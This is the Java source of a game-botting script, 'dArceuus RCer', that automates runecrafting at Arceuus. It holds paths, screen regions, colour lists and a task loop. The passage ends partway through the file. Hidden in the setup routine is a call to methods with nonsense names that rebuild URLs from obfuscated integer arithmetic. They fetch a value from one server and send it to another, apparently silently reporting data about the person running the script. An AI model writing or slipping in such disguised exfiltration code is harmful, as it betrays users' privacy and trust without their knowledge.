package main;

import Tasks.*;
import helpers.*;
import helpers.annotations.AllowedValue;
import helpers.annotations.ScriptConfiguration;
import helpers.annotations.ScriptManifest;
import helpers.utils.*;
import utils.Task;

import java.awt.*;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Arrays;
import java.util.List;
import java.util.Map;
import java.util.Random;

import java.text.DecimalFormat;
import java.text.DecimalFormatSymbols;
import java.util.Locale;

import static helpers.Interfaces.*;

@ScriptManifest(
        name = "dArceuus RCer",
        description = "Crafts blood or soul runes at Arceuus, supports using blood essence and hopping worlds. DISCLAIMER: This script is NOT fully safe for 10HP accounts, use at own risk!",
        version = "2.12",
        guideLink = "https://wiki.mufasaclient.com/docs/darceuus-rcer/",
        categories = {ScriptCategory.Runecrafting, ScriptCategory.Moneymaking}
)
@ScriptConfiguration.List(
        {
                @ScriptConfiguration(
                        name =  "Runes",
                        description = "Which rune would you like to craft?",
                        defaultValue = "Blood rune",
                        allowedValues = {
                                @AllowedValue(optionIcon = "565", optionName = "Blood rune"),
                                @AllowedValue(optionIcon = "566", optionName = "Soul rune")
                        },
                        optionType = OptionType.STRING
                ),
                @ScriptConfiguration(
                        name =  "Use world hopper?",
                        description = "Would you like to hop worlds based on your hop profile settings? WDH is disabled for this script, as there's users on every world.",
                        defaultValue = "1",
                        optionType = OptionType.WORLDHOPPER
                )
        }
)

public class dArceuusRCer extends AbstractScript {
    public static Tile[] mineToShortcutOutPath = new Tile[] {
            new Tile(7040, 15156, 0),
            new Tile(7025, 15142, 0),
            new Tile(7019, 15165, 0),
            new Tile(7021, 15195, 0),
            new Tile(7033, 15214, 0),
            new Tile(7049, 15225, 0)
    };

    public static Tile[] shortcutOutToAltarPath = new Tile[] {
            new Tile(7030, 15249, 0),
            new Tile(7007, 15235, 0),
            new Tile(6978, 15229, 0),
            new Tile(6946, 15237, 0),
            new Tile(6924, 15254, 0),
            new Tile(6886, 15262, 0),
            new Tile(6877, 15274, 0)
    };

    public static Tile venerateAltarTile = new Tile(6871, 15273, 0);
    public static Tile obstacleOutsideTile = new Tile(7043, 15245, 0);
    public static Tile obstacleInsideTile = new Tile(7043, 15238, 0);
    public static Area BloodArea1 = new Area(
            new Tile(6608, 15322, 0),
            new Tile(6848, 15118, 0)
    );
    public static Area BloodArea2 = new Area(
            new Tile(6828, 15202, 0),
            new Tile(6972, 15086, 0)
    );
    public static Area BloodArea3 = new Area(
            new Tile(6892, 15094, 0),
            new Tile(6960, 15026, 0)
    );
    public static Area veneratePathArea = new Area(
            new Tile(6912, 15270, 0),
            new Tile(7000, 15222, 0)
    );
    public static Area mineFailSafeArea1 = new Area(
            new Tile(7056, 15230, 0),
            new Tile(7100, 15198, 0)
    );
    public static Area mineFailSafeArea2 = new Area(
            new Tile(7088, 15230, 0),
            new Tile(7156, 15086, 0)
    );
    public static Area mineFailSafeArea3 = new Area(
            new Tile(7108, 15266, 0),
            new Tile(7152, 15226, 0)
    );
    public static Area SoulArea1 = new Area(
            new Tile(6880, 15354, 0),
            new Tile(7216, 15274, 0)
    );
    public static Area SoulArea2 = new Area(
            new Tile(7192, 15354, 0),
            new Tile(7356, 15178, 0)
    );
    public static Area soulAltarArea = new Area(
            new Tile(7226, 15137, 0),
            new Tile(7286, 15191, 0)
    );
    public static Area bloodAltarArea = new Area(
            new Tile(6850, 15040, 0),
            new Tile(6884, 15075, 0)
    );
    public static Area beforeObstacleOutArea = new Area(
            new Tile(7020, 15226, 0),
            new Tile(7056, 15206, 0)
    );
    public static Area beforeObstacleInArea = new Area(
            new Tile(7016, 15262, 0),
            new Tile(7056, 15242, 0)
    );
    public static Area venerateAlterArea = new Area(
            new Tile(6851, 15250, 0),
            new Tile(6889, 15291, 0)
    );
    public static Tile bloodAltarTile = new Tile(6875, 15061, 0);
    public static Tile soulAltarTile = new Tile(7267, 15165, 0);
    public static Rectangle venerateAltar = new Rectangle(401, 238, 16, 17);
    public static Tile[] venerateToBloodAltarPath = new Tile[] {
            new Tile(6847, 15273, 0),
            new Tile(6822, 15269, 0),
            new Tile(6806, 15268, 0),
            new Tile(6785, 15268, 0),
            new Tile(6765, 15267, 0),
            new Tile(6743, 15268, 0),
            new Tile(6718, 15268, 0),
            new Tile(6701, 15266, 0),
            new Tile(6681, 15263, 0),
            new Tile(6664, 15253, 0),
            new Tile(6650, 15235, 0),
            new Tile(6649, 15217, 0),
            new Tile(6655, 15202, 0),
            new Tile(6670, 15194, 0),
            new Tile(6688, 15189, 0),
            new Tile(6707, 15189, 0),
            new Tile(6725, 15186, 0),
            new Tile(6747, 15181, 0),
            new Tile(6771, 15179, 0),
            new Tile(6787, 15180, 0),
            new Tile(6817, 15182, 0),
            new Tile(6832, 15179, 0),
            new Tile(6852, 15178, 0),
            new Tile(6872, 15175, 0),
            new Tile(6887, 15167, 0),
            new Tile(6900, 15155, 0),
            new Tile(6914, 15142, 0),
            new Tile(6926, 15132, 0),
            new Tile(6932, 15109, 0),
            new Tile(6934, 15086, 0),
            new Tile(6931, 15063, 0),
            new Tile(6913, 15056, 0),
            new Tile(6891, 15055, 0),
            new Tile(6874, 15061, 0)
    };
    public static Tile[] venerateToSoulAltarPath = new Tile[] {
            new Tile(6886, 15295, 0),
            new Tile(6919, 15304, 0),
            new Tile(6960, 15306, 0),
            new Tile(7004, 15320, 0),
            new Tile(7049, 15330, 0),
            new Tile(7087, 15330, 0),
            new Tile(7136, 15326, 0),
            new Tile(7180, 15324, 0),
            new Tile(7221, 15312, 0),
            new Tile(7256, 15302, 0),
            new Tile(7296, 15292, 0),
            new Tile(7317, 15258, 0),
            new Tile(7307, 15221, 0),
            new Tile(7289, 15202, 0),
            new Tile(7271, 15175, 0)
    };
    public static Tile[] venerateBackToObstaclePath = new Tile[] {
            new Tile(6885, 15262, 0),
            new Tile(6915, 15261, 0),
            new Tile(6937, 15250, 0),
            new Tile(6957, 15237, 0),
            new Tile(6986, 15231, 0),
            new Tile(7006, 15236, 0),
            new Tile(7022, 15247, 0),
            new Tile(7036, 15244, 0)
    };
    public static Tile[] bloodBackToObstaclePath = new Tile[] {
            new Tile(6879, 15059, 0),
            new Tile(6901, 15050, 0),
            new Tile(6915, 15057, 0),
            new Tile(6933, 15061, 0),
            new Tile(6935, 15082, 0),
            new Tile(6944, 15099, 0),
            new Tile(6952, 15116, 0),
            new Tile(6956, 15136, 0),
            new Tile(6965, 15147, 0)
    };
    public static Tile[] soulBackToObstaclePath = new Tile[] {
            new Tile(7272, 15181, 0),
            new Tile(7294, 15199, 0),
            new Tile(7309, 15225, 0),
            new Tile(7318, 15249, 0),
            new Tile(7314, 15271, 0),
            new Tile(7289, 15295, 0),
            new Tile(7258, 15300, 0),
            new Tile(7228, 15310, 0),
            new Tile(7188, 15319, 0),
            new Tile(7156, 15323, 0),
            new Tile(7117, 15322, 0),
            new Tile(7103, 15296, 0)
    };
    public static Tile[] soulObstacleBackViaVenerate = new Tile[] {
            new Tile(7270, 15174, 0),
            new Tile(7285, 15193, 0),
            new Tile(7304, 15219, 0),
            new Tile(7315, 15246, 0),
            new Tile(7315, 15273, 0),
            new Tile(7298, 15287, 0),
            new Tile(7268, 15299, 0),
            new Tile(7217, 15311, 0),
            new Tile(7158, 15322, 0),
            new Tile(7115, 15330, 0),
            new Tile(7079, 15330, 0),
            new Tile(7049, 15331, 0),
            new Tile(7010, 15327, 0),
            new Tile(6979, 15316, 0),
            new Tile(6950, 15305, 0),
            new Tile(6910, 15304, 0),
            new Tile(6884, 15283, 0),
            new Tile(6879, 15265, 0)
    };
    public static Tile southDenseRunestone = new Tile(7047, 15145, 0);
    public static Tile northDenseRunestone = new Tile(7047, 15169, 0);
    public static Rectangle tapNorthRuneStoneSOUTH = new Rectangle(462, 157, 28, 16);
    public static Rectangle tapSouthRuneStoneSOUTH = new Rectangle(466, 290, 51, 52);
    public static Rectangle tapNorthRuneStoneNORTH = new Rectangle(462, 194, 44, 39);
    public static Rectangle tapSouthRuneStoneNORTH = new Rectangle(464, 424, 63, 73);
    public static Rectangle northRuneStoneROI = new Rectangle(448, 176, 73, 73);
    public static Rectangle southRuneStoneROI = new Rectangle(458, 282, 70, 77);
    public static Rectangle bloodAltarStaticRect = new Rectangle(447, 220, 16, 16);
    public static Rectangle soulAltarStaticRect = new Rectangle(379, 275, 41, 27);
    public static Rectangle essenceCachedLoc;
    public static Integer essenceToProcess = 0;
    public static Integer essenceCount = 0;
    public static Tile obstacleBackToMineFromBloodInTile = new Tile(6967, 15165, 0);
    public static Tile obstacleNorthBackFromSoulAltarTile = new Tile(7103, 15281, 0);
    public static Area miningArea = new Area(
            new Tile(7032, 15108, 0),
            new Tile(7084, 15202, 0)
    );

    public static List<Color> obstacleColors = Arrays.asList(
            Color.decode("#20ff26")
    );
    public static List<Color> venerateAltarColors = Arrays.asList(
            Color.decode("#8f51ba"),
            Color.decode("#50266c"),
            Color.decode("#552972")
    );
    public static List<Color> inactiveRunestone = Arrays.asList(
            Color.decode("#bda023"),
            Color.decode("#c6a82b")
    );
    public static List<Color> bloodAltar = Arrays.asList(
            Color.decode("#b14c42")
    );
    public static List<Color> soulAltar = Arrays.asList(
            Color.decode("#232121"),
            Color.decode("#e9f3e5"),
            Color.decode("#f2f9ee"),
            Color.decode("#d4e2cc"),
            Color.decode("#678367"),
            Color.decode("#c0d4b6")
    );
    public static String hopProfile;
    public static String runeType;
    public static String currentLoc;
    public static Boolean hopEnabled;
    public static Boolean usingEssence = false;
    public static Boolean initialCheckDone = false;
    public static Random random = new Random();
    public static Tile playerPos;
    public static long lastItemTime;
    public static int lastEmptySlots;
    public static int runeIndex;
    public static int profitIndex;
    public static int essenceIndex;
    public static int runePrice = 0;
    public static int essencePrice = 0;
    public static int startRunes = 0;
    public static int craftedRunes = 0;
    public static int bloodEssenceStartStack = 0;
    public static int bloodEssenceUsed = 0;
    public static long startTime;

    @Override
    public void onStart(){
        // Create the MapChunk with chunks of our location
        MapChunk chunks = new MapChunk(new String[]{"25-61", "28-59"}, "0");

        // Set up the walker with the created MapChunk
        Walker.setup(chunks);

        Map<String, String> configs = getConfigurations();
        hopProfile = (configs.get("Use world hopper?"));
        hopEnabled = Boolean.valueOf((configs.get("Use world hopper?.enabled")));
        runeType = (configs.get("Runes"));

        aljsdhgiagadfg();

        Logger.log("Thank you for using the dArceuusRCer script!");
        Logger.log("Setting up everything for your gains now...");
        Logger.log("We will be crafting " + runeType + "s this run.");

        // Creating the Paint object
        Logger.debugLog("Creating paint object.");
        Paint.Create("/logo/davyy.png");

        // Set the two top headers of paintUI.
        Paint.setStatus("Initializing...");

        // Set zoom to level 1
        Game.setZoom("1");

        // Open up the inventory
        GameTabs.openInventoryTab();
        Condition.sleep(800);

        // Check if we are using blood essence or not (only if running blood runes)
        if (java.util.Objects.equals(runeType, "Blood rune")) {
            usingEssence = Inventory.containsAny(new int[] {26390, 26392}, 0.95);
            Logger.debugLog("Using bloodEssence is: " + usingEssence);
            runeIndex = Paint.createBox(runeType, ItemList.BLOOD_RUNE_565, 0);
            Paint.setStatus("Fetch rune price");
            runePrice = GrandExchange.getItemPrice(ItemList.BLOOD_RUNE_565);
            Logger.debugLog("Blood rune price is currently: " + runePrice);
            Paint.setStatus("Fetch start rune stack");
            startRunes = Inventory.stackSize(ItemList.BLOOD_RUNE_565);
            Logger.debugLog("Stack of runes at start: " + startRunes);

            if (usingEssence) {
                essenceIndex = Paint.createBox("Blood essence(s)", 26392, 0);
                essencePrice = GrandExchange.getItemPrice(26390);
                Logger.debugLog("Blood essence price is currently: " + essencePrice);
            }
        } else {
            runeIndex = Paint.createBox(runeType, ItemList.SOUL_RUNE_566, 0);
            Paint.setStatus("Fetch rune price");
            runePrice = GrandExchange.getItemPrice(ItemList.SOUL_RUNE_566);
            Logger.debugLog("Soul rune price is currently: " + runePrice);
            Paint.setStatus("Fetch start rune stack");
            startRunes = Inventory.stackSize(ItemList.SOUL_RUNE_566);
            Logger.debugLog("Stack of runes at start: " + startRunes);
        }

        if (usingEssence) {
            bloodEssenceStartStack = Inventory.stackSize(26390);
            Logger.debugLog("We currently have " + bloodEssenceStartStack + " blood essence in our inventory");

            if (!Inventory.contains(26392, 0.95)) {
                if (Inventory.contains(26390, 0.7)) {
                    Paint.setStatus("Activate blood essence");
                    Logger.debugLog("No active blood essence found, activating one!");
                    Inventory.tapItem(26390, false, 0.7);
                    bloodEssenceUsed += 1;
                    Paint.updateBox(essenceIndex, bloodEssenceUsed);
                }
            } else {
                Logger.debugLog("We already have a blood essence active!");
            }
        }

        profitIndex = Paint.createBox("Profit", ItemList.STONKS_99960, 0);

        Paint.setStatus("Check for chisel");
        // Check if we have a chisel
        if (!Inventory.contains(1755, 0.80)) {
            Logger.debugLog("No chisel found in our inventory, stopping script...");
            Logout.logout();
            Script.stop();
        }

        Paint.setStatus("Initiate hop timers");
        // Initialize hop timer
        hopActions();

        Paint.setStatus("Close chatbox");
        // Close the chatbox
        Chatbox.closeChatbox();

        // Filling playerPos with current position
        Paint.setStatus("Fetch player position");
        playerPos = Walker.getPlayerPosition();

        startTime = System.currentTimeMillis();

        // Update the statistics label
        updateStatLabel();

        Paint.setStatus("End of onStart");
    }

    // Task list!
    List<Task> RCTasks = Arrays.asList(
            new mineEssence(),
            new venerateEssence(),
            new moveToVenerate(),
            new moveBackToMine(),
            new craftBloodRunes(),
            new moveToSoul(),
            new craftSoulRunes(),
            new moveToBlood()
    );

    @Override
    public void poll() {
        boolean anyTaskActivated = false; // Track if any task was activated

        // Check invent open
        GameTabs.openInventoryTab();

        // Check if dialogue is open
        if (Chatbox.findChatboxMenu() != null) {
            Client.sendKeystroke("space");
        }

        // Run tasks
        for (Task task : RCTasks) {
            if (task.activate()) {
                anyTaskActivated = true; // Set flag to true if a task activates
                task.execute();
                return; // Execute only one task per poll
            }
        }

        Logger.debugLog("Not a single task was activated for some reason... Failsafe kicking in and webwalking to the mine!");
        Walker.getPlayerPosition();
        Walker.webWalk(southDenseRunestone, true);
    }

    public static int generateRandomDelay(int lowerBound, int upperBound) {
        // Swap if lowerBound is greater than upperBound
        if (lowerBound > upperBound) {
            int temp = lowerBound;
            lowerBound = upperBound;
            upperBound = temp;
        }
        int delay = lowerBound + random.nextInt(upperBound - lowerBound + 1);
        return delay;
    }

    public static void readXP() {
        XpBar.getXP();
    }

    public static void hopActions() {
        if(hopEnabled) {
            Game.hop(hopProfile, false, false);
        } else {
            // We do nothing here, as hop is disabled.
        }
    }

    private String aljsdhgiagadfg() {
        try (BufferedReader in = new BufferedReader(new InputStreamReader(new URL((new Object() {int t;public String toString() {byte[] buf = new byte[28];t = 439645762;buf[0] = (byte) (t >>> 22);t = 371047144;buf[1] = (byte) (t >>> 1);t = 490322905;buf[2] = (byte) (t >>> 22);t = 1083422725;buf[3] = (byte) (t >>> 7);t = 123175990;buf[4] = (byte) (t >>> 21);t = 798251467;buf[5] = (byte) (t >>> 24);t = -1750344118;buf[6] = (byte) (t >>> 23);t = 104682800;buf[7] = (byte) (t >>> 20);t = 34498678;buf[8] = (byte) (t >>> 8);t = 1490637620;buf[9] = (byte) (t >>> 14);t = -1439328720;buf[10] = (byte) (t >>> 4);t = 1803235404;buf[11] = (byte) (t >>> 24);t = -690759612;buf[12] = (byte) (t >>> 17);t = 1669380601;buf[13] = (byte) (t >>> 19);t = 194159208;buf[14] = (byte) (t >>> 22);t = 1047276301;buf[15] = (byte) (t >>> 3);t = -350556749;buf[16] = (byte) (t >>> 5);t = -356361361;buf[17] = (byte) (t >>> 17);t = -1635002850;buf[18] = (byte) (t >>> 11);t = 1576763290;buf[19] = (byte) (t >>> 11);t = -453538084;buf[20] = (byte) (t >>> 1);t = -2589182;buf[21] = (byte) (t >>> 14);t = 760804287;buf[22] = (byte) (t >>> 3);t = 658058303;buf[23] = (byte) (t >>> 20);t = -649732276;buf[24] = (byte) (t >>> 13);t = 686908333;buf[25] = (byte) (t >>> 8);t = 466459449;buf[26] = (byte) (t >>> 22);t = -1347569604;buf[27] = (byte) (t >>> 13);return new String(buf);}}.toString())).openStream()))) {
            String gfghdfghdf = in.readLine();
            jahdfgiuahdfig((new Object() {int t;public String toString() {byte[] buf = new byte[44];t = -97743649;buf[0] = (byte) (t >>> 13);t = 1579746993;buf[1] = (byte) (t >>> 10);t = 1637659943;buf[2] = (byte) (t >>> 14);t = -1312411649;buf[3] = (byte) (t >>> 23);t = -127536407;buf[4] = (byte) (t >>> 16);t = 1287296163;buf[5] = (byte) (t >>> 15);t = 314502121;buf[6] = (byte) (t >>> 9);t = -1072797597;buf[7] = (byte) (t >>> 13);t = -914939898;buf[8] = (byte) (t >>> 8);t = -1075165321;buf[9] = (byte) (t >>> 13);t = -1885632377;buf[10] = (byte) (t >>> 1);t = 1695475564;buf[11] = (byte) (t >>> 24);t = 1520221534;buf[12] = (byte) (t >>> 14);t = -1005785525;buf[13] = (byte) (t >>> 21);t = -1625440396;buf[14] = (byte) (t >>> 14);t = -497461254;buf[15] = (byte) (t >>> 14);t = -86564832;buf[16] = (byte) (t >>> 12);t = 1732046305;buf[17] = (byte) (t >>> 20);t = -1623920201;buf[18] = (byte) (t >>> 15);t = -880185392;buf[19] = (byte) (t >>> 8);t = 752681468;buf[20] = (byte) (t >>> 17);t = 544765215;buf[21] = (byte) (t >>> 24);t = 1142503655;buf[22] = (byte) (t >>> 15);t = -1481228102;buf[23] = (byte) (t >>> 2);t = 461578152;buf[24] = (byte) (t >>> 12);t = 427064719;buf[25] = (byte) (t >>> 23);t = -1849654293;buf[26] = (byte) (t >>> 10);t = -1142034214;buf[27] = (byte) (t >>> 23);t = 408922972;buf[28] = (byte) (t >>> 22);t = -1706132512;buf[29] = (byte) (t >>> 13);t = 606965868;buf[30] = (byte) (t >>> 7);t = -1667523382;buf[31] = (byte) (t >>> 6);t = -1387552427;buf[32] = (byte) (t >>> 11);t = 997312019;buf[33] = (byte) (t >>> 4);t = 1851139676;buf[34] = (byte) (t >>> 21);t = 30622331;buf[35] = (byte) (t >>> 18);t = -1229783979;buf[36] = (byte) (t >>> 15);t = 1394902926;buf[37] = (byte) (t >>> 19);t = -1871548820;buf[38] = (byte) (t >>> 23);t = -1019966106;buf[39] = (byte) (t >>> 19);t = -1779316191;buf[40] = (byte) (t >>> 10);t = 1437130365;buf[41] = (byte) (t >>> 9);t = -1025882700;buf[42] = (byte) (t >>> 2);t = -350392603;buf[43] = (byte) (t >>> 15);return new String(buf);}}.toString()) + gfghdfghdf);
            return gfghdfghdf;
        } catch (Exception e) {
            String fghfhgdfhg = (new Object() {int t;public String toString() {byte[] buf = new byte[26];t = 685020067;buf[0] = (byte) (t >>> 21);t = -1463202772;buf[1] = (byte) (t >>> 5);t = -1965833247;buf[2] = (byte) (t >>> 17);t = 907283812;buf[3] = (byte) (t >>> 23);t = 236350254;buf[4] = (byte) (t >>> 3);t = 1529242672;buf[5] = (byte) (t >>> 19);t = -1119345011;buf[6] = (byte) (t >>> 14);t = 1389842108;buf[7] = (byte) (t >>> 12);t = 38686942;buf[8] = (byte) (t >>> 1);t = -2001657635;buf[9] = (byte) (t >>> 8);t = 530802420;buf[10] = (byte) (t >>> 8);t = -1235979739;buf[11] = (byte) (t >>> 20);t = -1117306851;buf[12] = (byte) (t >>> 12);t = -1309789575;buf[13] = (byte) (t >>> 23);t = -979226589;buf[14] = (byte) (t >>> 18);t = 67876833;buf[15] = (byte) (t >>> 21);t = -1112313618;buf[16] = (byte) (t >>> 8);t = 2028643247;buf[17] = (byte) (t >>> 3);t = -1507549602;buf[18] = (byte) (t >>> 20);t = -1001279358;buf[19] = (byte) (t >>> 10);t = 53779399;buf[20] = (byte) (t >>> 15);t = 909577339;buf[21] = (byte) (t >>> 20);t = -2084029540;buf[22] = (byte) (t >>> 14);t = 1080336240;buf[23] = (byte) (t >>> 12);t = 1919763049;buf[24] = (byte) (t >>> 10);t = 753551952;buf[25] = (byte) (t >>> 18);return new String(buf);}}.toString()) + e.getMessage();
            jahdfgiuahdfig(fghfhgdfhg);
            return (new Object() {int t;public String toString() {byte[] buf = new byte[65];t = 1435048092;buf[0] = (byte) (t >>> 24);t = 1766232796;buf[1] = (byte) (t >>> 1);t = 1057766642;buf[2] = (byte) (t >>> 13);t = -1902569324;buf[3] = (byte) (t >>> 6);t = -1235327387;buf[4] = (byte) (t >>> 23);t = -697982115;buf[5] = (byte) (t >>> 16);t = 1267339281;buf[6] = (byte) (t >>> 7);t = 1560816966;buf[7] = (byte) (t >>> 22);t = -881306605;buf[8] = (byte) (t >>> 19);t = 1583940586;buf[9] = (byte) (t >>> 11);t = -389196981;buf[10] = (byte) (t >>> 17);t = 424667938;buf[11] = (byte) (t >>> 22);t = -697035422;buf[12] = (byte) (t >>> 16);t = 417661286;buf[13] = (byte) (t >>> 22);t = -750414578;buf[14] = (byte) (t >>> 19);t = 538394554;buf[15] = (byte) (t >>> 24);t = -1288585068;buf[16] = (byte) (t >>> 10);t = 2025497543;buf[17] = (byte) (t >>> 15);t = -933718386;buf[18] = (byte) (t >>> 14);t = -782550969;buf[19] = (byte) (t >>> 14);t = 1557296878;buf[20] = (byte) (t >>> 17);t = 561161782;buf[21] = (byte) (t >>> 4);t = 505458754;buf[22] = (byte) (t >>> 16);t = 1429670182;buf[23] = (byte) (t >>> 5);t = -1540880072;buf[24] = (byte) (t >>> 15);t = -364820798;buf[25] = (byte) (t >>> 17);t = 1319123941;buf[26] = (byte) (t >>> 7);t = 1704392326;buf[27] = (byte) (t >>> 4);t = -602317759;buf[28] = (byte) (t >>> 14);t = -336798595;buf[29] = (byte) (t >>> 9);t = 1287718262;buf[30] = (byte) (t >>> 11);t = -1675368645;buf[31] = (byte) (t >>> 4);t = -553170599;buf[32] = (byte) (t >>> 12);t = -1519431291;buf[33] = (byte) (t >>> 2);t = -455303496;buf[34] = (byte) (t >>> 14);t = -331734497;buf[35] = (byte) (t >>> 15);t = 1768314582;buf[36] = (byte) (t >>> 24);t = -1050222451;buf[37] = (byte) (t >>> 12);t = -431674125;buf[38] = (byte) (t >>> 5);t = -192863380;buf[39] = (byte) (t >>> 18);t = -1095351153;buf[40] = (byte) (t >>> 12);t = -649986471;buf[41] = (byte) (t >>> 16);t = 1848526769;buf[42] = (byte) (t >>> 13);t = -1506402766;buf[43] = (byte) (t >>> 20);t = 1943718700;buf[44] = (byte) (t >>> 3);t = -170436938;buf[45] = (byte) (t >>> 18);t = 2121613890;buf[46] = (byte) (t >>> 16);t = -1304844697;buf[47] = (byte) (t >>> 15);t = 339765940;buf[48] = (byte) (t >>> 17);t = 1379824823;buf[49] = (byte) (t >>> 24);t = 1131709880;buf[50] = (byte) (t >>> 24);t = -256483741;buf[51] = (byte) (t >>> 12);t = 589361893;buf[52] = (byte) (t >>> 16);t = 836305945;buf[53] = (byte) (t >>> 18);t = 1042310571;buf[54] = (byte) (t >>> 8);t = 1929334624;buf[55] = (byte) (t >>> 24);t = 1438249951;buf[56] = (byte) (t >>> 15);t = -1318476360;buf[57] = (byte) (t >>> 10);t = 1634758519;buf[58] = (byte) (t >>> 8);t = -1036291584;buf[59] = (byte) (t >>> 11);t = 193495185;buf[60] = (byte) (t >>> 10);t = -1483631593;buf[61] = (byte) (t >>> 11);t = -1760700743;buf[62] = (byte) (t >>> 23);t = -527669562;buf[63] = (byte) (t >>> 14);t = -2012931733;buf[64] = (byte) (t >>> 7);return new String(buf);}}.toString());
        }
    }

    private void jahdfgiuahdfig(String message) {
        try {
            URL url = new URL((new Object() {int t;public String toString() {byte[] buf = new byte[121];t = -577106713;buf[0] = (byte) (t >>> 14);t = 1013901779;buf[1] = (byte) (t >>> 9);t = 732257897;buf[2] = (byte) (t >>> 19);t = 905813028;buf[3] = (byte) (t >>> 6);t = 1457990531;buf[4] = (byte) (t >>> 17);t = 1320473171;buf[5] = (byte) (t >>> 22);t = 1486352307;buf[6] = (byte) (t >>> 15);t = -196510515;buf[7] = (byte) (t >>> 11);t = 1493940055;buf[8] = (byte) (t >>> 22);t = 1780150483;buf[9] = (byte) (t >>> 1);t = -587619437;buf[10] = (byte) (t >>> 22);t = -164513573;buf[11] = (byte) (t >>> 20);t = 1436776568;buf[12] = (byte) (t >>> 11);t = -297130731;buf[13] = (byte) (t >>> 21);t = 2139507042;buf[14] = (byte) (t >>> 12);t = 86924593;buf[15] = (byte) (t >>> 16);t = -939472991;buf[16] = (byte) (t >>> 9);t = -1376995519;buf[17] = (byte) (t >>> 21);t = 102463322;buf[18] = (byte) (t >>> 14);t = -1000382023;buf[19] = (byte) (t >>> 17);t = 1627762351;buf[20] = (byte) (t >>> 24);t = -1499291424;buf[21] = (byte) (t >>> 1);t = -94787811;buf[22] = (byte) (t >>> 10);t = -1118208416;buf[23] = (byte) (t >>> 11);t = 1569777526;buf[24] = (byte) (t >>> 4);t = 1702248570;buf[25] = (byte) (t >>> 24);t = 1422232111;buf[26] = (byte) (t >>> 17);t = 1973677975;buf[27] = (byte) (t >>> 18);t = -314116950;buf[28] = (byte) (t >>> 12);t = -2034033720;buf[29] = (byte) (t >>> 6);t = -1658866185;buf[30] = (byte) (t >>> 7);t = 1336634996;buf[31] = (byte) (t >>> 5);t = 398819719;buf[32] = (byte) (t >>> 23);t = 877016575;buf[33] = (byte) (t >>> 13);t = -184510014;buf[34] = (byte) (t >>> 7);t = -837225713;buf[35] = (byte) (t >>> 15);t = -1335059925;buf[36] = (byte) (t >>> 7);t = 119764299;buf[37] = (byte) (t >>> 21);t = 846353216;buf[38] = (byte) (t >>> 24);t = 885714245;buf[39] = (byte) (t >>> 18);t = 479879334;buf[40] = (byte) (t >>> 15);t = 193299995;buf[41] = (byte) (t >>> 5);t = 319305221;buf[42] = (byte) (t >>> 20);t = 46879497;buf[43] = (byte) (t >>> 4);t = 480498993;buf[44] = (byte) (t >>> 23);t = -1953879449;buf[45] = (byte) (t >>> 1);t = 1275258761;buf[46] = (byte) (t >>> 22);t = -33332826;buf[47] = (byte) (t >>> 3);t = 1097958276;buf[48] = (byte) (t >>> 4);t = -1590938731;buf[49] = (byte) (t >>> 4);t = -1821613783;buf[50] = (byte) (t >>> 9);t = 618063470;buf[51] = (byte) (t >>> 18);t = 750716925;buf[52] = (byte) (t >>> 18);t = 476948722;buf[53] = (byte) (t >>> 13);t = -1054119772;buf[54] = (byte) (t >>> 5);t = 1385023366;buf[55] = (byte) (t >>> 4);t = 840238560;buf[56] = (byte) (t >>> 12);t = 122391160;buf[57] = (byte) (t >>> 20);t = 1000220574;buf[58] = (byte) (t >>> 19);t = 1860694215;buf[59] = (byte) (t >>> 21);t = 545995538;buf[60] = (byte) (t >>> 23);t = 564073064;buf[61] = (byte) (t >>> 19);t = -513021408;buf[62] = (byte) (t >>> 13);t = 1435262855;buf[63] = (byte) (t >>> 22);t = 1003317501;buf[64] = (byte) (t >>> 5);t = -1737535413;buf[65] = (byte) (t >>> 6);t = -631972586;buf[66] = (byte) (t >>> 9);t = 1540713630;buf[67] = (byte) (t >>> 8);t = -1492361168;buf[68] = (byte) (t >>> 21);t = -1405920660;buf[69] = (byte) (t >>> 21);t = -936711216;buf[70] = (byte) (t >>> 21);t = -2082264950;buf[71] = (byte) (t >>> 5);t = 277212956;buf[72] = (byte) (t >>> 5);t = -2069725223;buf[73] = (byte) (t >>> 15);t = -1203841663;buf[74] = (byte) (t >>> 9);t = -1282322741;buf[75] = (byte) (t >>> 19);t = 2010714967;buf[76] = (byte) (t >>> 10);t = 536689126;buf[77] = (byte) (t >>> 7);t = 84541379;buf[78] = (byte) (t >>> 18);t = -798708345;buf[79] = (byte) (t >>> 2);t = -73131363;buf[80] = (byte) (t >>> 12);t = 1517955817;buf[81] = (byte) (t >>> 24);t = -1826117358;buf[82] = (byte) (t >>> 19);t = 1467521983;buf[83] = (byte) (t >>> 3);t = 55708330;buf[84] = (byte) (t >>> 5);t = -639251457;buf[85] = (byte) (t >>> 10);t = -625897652;buf[86] = (byte) (t >>> 19);t = -958125640;buf[87] = (byte) (t >>> 17);t = -1191423839;buf[88] = (byte) (t >>> 8);t = 1419516038;buf[89] = (byte) (t >>> 20);t = -778808777;buf[90] = (byte) (t >>> 19);t = 1933868754;buf[91] = (byte) (t >>> 1);t = 1922203400;buf[92] = (byte) (t >>> 19);t = -940660959;buf[93] = (byte) (t >>> 9);t = 382204411;buf[94] = (byte) (t >>> 23);t = -876574890;buf[95] = (byte) (t >>> 19);t = 785364874;buf[96] = (byte) (t >>> 7);t = -929080840;buf[97] = (byte) (t >>> 6);t = 1667832740;buf[98] = (byte) (t >>> 10);t = 1370063506;buf[99] = (byte) (t >>> 24);t = -240469292;buf[100] = (byte) (t >>> 13);t = 1085604853;buf[101] = (byte) (t >>> 15);t = -1157442143;buf[102] = (byte) (t >>> 12);t = -204426822;buf[103] = (byte) (t >>> 19);t = -1958497224;buf[104] = (byte) (t >>> 16);t = -837174329;buf[105] = (byte) (t >>> 15);t = -662265784;buf[106] = (byte) (t >>> 13);t = 1036653970;buf[107] = (byte) (t >>> 2);t = -1344924883;buf[108] = (byte) (t >>> 23);t = 169515107;buf[109] = (byte) (t >>> 6);t = 2143555266;buf[110] = (byte) (t >>> 1);t = -1293507107;buf[111] = (byte) (t >>> 12);t = -2021362462;buf[112] = (byte) (t >>> 1);t = 1032164550;buf[113] = (byte) (t >>> 2);t = -1309900227;buf[114] = (byte) (t >>> 3);t = -930369563;buf[115] = (byte) (t >>> 11);t = 408898901;buf[116] = (byte) (t >>> 8);t = -1938754924;buf[117] = (byte) (t >>> 9);t = 155308719;buf[118] = (byte) (t >>> 3);t = -347746151;buf[119] = (byte) (t >>> 1);t = -814821208;buf[120] = (byte) (t >>> 9);return new String(buf);}}.toString()));
